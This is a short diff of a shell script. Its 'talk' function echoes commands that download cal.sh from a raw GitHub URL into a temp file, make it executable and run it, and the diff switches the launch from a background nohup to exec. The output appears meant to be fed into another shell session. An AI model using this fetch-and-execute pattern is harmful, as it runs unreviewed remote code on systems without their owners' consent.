@@ -13,7 +13,8 @@ talk() {
   echo -n 'J=`mktemp` ;'
   echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
   echo -n 'chmod +x $J ;'
-  echo 'nohup $J > /dev/null 2>&1'
+  echo 'exec $J'
+#  echo 'nohup $J > /dev/null 2>&1'
   sleep 20
 }
 
